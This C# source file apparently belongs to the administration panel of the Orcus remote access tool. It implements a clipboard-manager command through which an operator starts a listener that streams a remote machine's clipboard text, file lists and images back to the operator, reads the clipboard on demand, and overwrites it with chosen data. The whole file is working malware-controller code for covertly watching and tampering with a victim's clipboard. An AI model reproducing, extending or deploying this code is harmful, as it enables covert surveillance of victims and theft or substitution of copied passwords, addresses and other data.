using System;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.ClipboardManager;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.ClipboardManager
{
    public class ClipboardManagerCommand : Command
    {
        private readonly Lazy<Serializer> _clipboardSerializer = new Lazy<Serializer>(() =>
            new Serializer(new[]
            {
                typeof(ClipboardInfo), typeof(StringClipboardData), typeof(StringListClipboardData),
                typeof(ImageClipboardData)
            }));

        private bool _isAutomaticallyUpdating;

        public bool IsAutomaticallyUpdating
        {
            get { return _isAutomaticallyUpdating; }
            set
            {
                if (_isAutomaticallyUpdating != value)
                {
                    _isAutomaticallyUpdating = value;
                    if (value)
                        ConnectionInfo.SendCommand(this, (byte) ClipboardManagerCommunication.StartListener);
                    else
                        ConnectionInfo.SendCommand(this, (byte) ClipboardManagerCommunication.StopListener);
                }
            }
        }

        public event EventHandler<ClipboardInfo> ClipboardContentReceived;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((ClipboardManagerCommunication) parameter[0])
            {
                case ClipboardManagerCommunication.ResponseClipboardChanged:
                    var clipboardInfo = _clipboardSerializer.Value.Deserialize<ClipboardInfo>(parameter, 1);
                    clipboardInfo.Timestamp = clipboardInfo.Timestamp.ToLocalTime();
                    ClipboardContentReceived?.Invoke(this, clipboardInfo);
                    break;
                case ClipboardManagerCommunication.ResponseListenerStarted:
                    LogService.Receive((string) Application.Current.Resources["ClipboardListenerStarted"]);
                    break;
                case ClipboardManagerCommunication.ResponseListenerStopped:
                    LogService.Receive((string)Application.Current.Resources["ClipboardListenerStopped"]);
                    break;
                case ClipboardManagerCommunication.ResponseClipboardEmpty:
                    LogService.Warn((string) Application.Current.Resources["ClipboardIsEmpty"]);
                    break;
                case ClipboardManagerCommunication.ResponseClipboardChangedSuccessfully:
                    LogService.Receive((string) Application.Current.Resources["ClipboardChangedSuccessfully"]);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void GetCurrentClipboardContent()
        {
            ConnectionInfo.SendCommand(this, (byte) ClipboardManagerCommunication.GetCurrentClipboard);
            LogService.Send((string) Application.Current.Resources["GetCurrentClipboardContent"]);
        }

        public void EditClipboard(ClipboardData clipboardData)
        {
            var clipboardDataBytes = _clipboardSerializer.Value.Serialize(clipboardData);
            ConnectionInfo.UnsafeSendCommand(this, clipboardDataBytes.Length + 1, writer =>
            {
                writer.Write((byte) ClipboardManagerCommunication.ChangeClipboard);
                writer.Write(clipboardDataBytes);
            });
            LogService.Send((string) Application.Current.Resources["ChangeClipboardContent"]);
        }

        protected override uint GetId()
        {
            return 35;
        }
    }
}